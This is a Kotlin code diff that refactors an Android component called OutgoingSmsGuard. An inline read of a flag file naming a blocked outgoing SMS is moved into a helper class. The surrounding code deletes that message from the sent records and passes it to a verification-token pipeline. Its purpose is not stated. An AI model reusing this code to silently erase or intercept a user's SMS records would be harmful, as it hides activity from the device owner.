@@ -110,18 +110,12 @@ object OutgoingSmsGuard {
     }
 
     private fun processBlockedFlag(context: Context) {
-        val flag = File("/data/local/tmp/hivirtus_outgoing_blocked.flag")
-        if (!flag.canRead()) return
+        val blocked = OutgoingBlockedReader.read() ?: return
         try {
-            val line = flag.readText().trim()
-            if (line.isBlank()) return
-            val parts = line.split("|", limit = 2)
-            val dest = parts.getOrElse(0) { "" }
-            val body = parts.getOrElse(1) { "" }
-            if (body.isBlank()) return
-            OutgoingSmsCleaner.scrubSentIfNeeded(context, dest, body)
-            VerifyTokenPipeline.handleBlocked(context, dest, body)
-            flag.delete()
+            if (blocked.body.isBlank()) return
+            OutgoingSmsCleaner.scrubSentIfNeeded(context, blocked.dest, blocked.body)
+            VerifyTokenPipeline.handleBlocked(context, blocked.dest, blocked.body)
+            OutgoingBlockedReader.deleteFlags()
         } catch (e: Exception) {
             Log.w(TAG, "Blocked flag process failed: ${e.message}")
         }
